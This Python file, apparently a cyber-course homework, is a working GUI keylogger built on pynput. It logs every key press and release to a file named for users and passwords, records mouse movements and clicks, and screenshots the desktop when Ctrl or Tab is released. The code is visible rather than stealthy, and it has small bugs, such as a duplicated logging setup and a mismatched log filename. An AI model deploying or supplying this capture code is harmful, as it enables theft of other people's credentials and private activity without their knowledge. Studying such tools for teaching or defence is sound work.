import sys
from tkinter import *
from tkinter.filedialog import asksaveasfilename

import pyautogui as pyautogui
from pynput import keyboard
from pynput.mouse import Listener as MouseListener
from pynput.keyboard import Listener as KeyboardListener
from threading import Thread
import time
import logging as l1
import logging as l2
import autopy

l1.basicConfig(filename="KeyLogger.txt", level=l1.DEBUG, format='%(asctime)s: %(message)s')
l2.basicConfig(filename="Users&Passwords.txt", level=l2.DEBUG, format='%(asctime)s: %(message)s')


def Capture_screen():
    bitmap = autopy.bitmap.capture_screen()
    bitmap.save('C:/Users/sizex/Desktop/הנדסת תוכנה/שנה ב/סמסטר ב/מבוא לסייבר/HW1 - Key Logger/KeyLogger/ScreenShots/Screen_Shot.png')


def on_press(key):
    l2.info("Key pressed: {0}".format(key))


def on_release(key):
    if key is keyboard.Key.ctrl_l or key is keyboard.Key.tab:
        Capture_screen()
    l2.info("Key released: {0}".format(key))

def on_move(x, y):
    l1.info("Mouse moved to ({0}, {1})".format(x, y))

def on_click(x, y, button, pressed):
    if pressed:
        l1.info('Mouse clicked at ({0}, {1}) with {2}'.format(x, y, button))
    else:
        l1.info('Mouse released at ({0}, {1}) with {2}'.format(x, y, button))

def on_scroll(x, y, dx, dy):
    l1.info('Mouse scrolled at ({0}, {1})({2}, {3})'.format(x, y, dx, dy))

def open_log():
    ff = open("KeyLogger.txt", "r")
    gg = open("Users&Passwords", 'r')
    print(gg.read())
    print(ff.read())

keyboard_listener = KeyboardListener(on_press=on_press, on_release=on_release)
mouse_listener = MouseListener(on_move=on_move, on_click=on_click, on_scroll=on_scroll)

def _Start():
    keyboard_listener.start()
    mouse_listener.start()
    keyboard_listener.join()
    mouse_listener.join()
    time.sleep(10)

def Start():
    new_thread = Thread(target=_Start, daemon=True)
    new_thread.start()

def Stop():
    keyboard_listener.stop()
    mouse_listener.stop()

def Exit():
    sys.exit()


root = Tk()
root.title("Keylogger")
root.geometry("300x250")
root.configure(bg="#F1F1F7")

theLabel = Label(root, text="Keylogger")
theLabel.pack()

button1 = Button(root, text="Start", bg="#0619A6", fg="white", command=Start)
button1.pack(fill=X)

button2 = Button(root, text="Open Log", bg="#0619A6", fg="white", command=open_log)
button2.pack(fill=X)

button22 = Button(root, text="Stop", bg="#0619A6", fg="white", command=Stop)
button22.pack(fill=X)

button4 = Button(root, text="Screen Shots", bg="#0619A6", fg="white", command=Capture_screen)
button4.pack(fill=X)

button3 = Button(root, text="Exit", bg="#0619A6", fg="white", command=Exit)
button3.pack(fill=X)




root.mainloop()
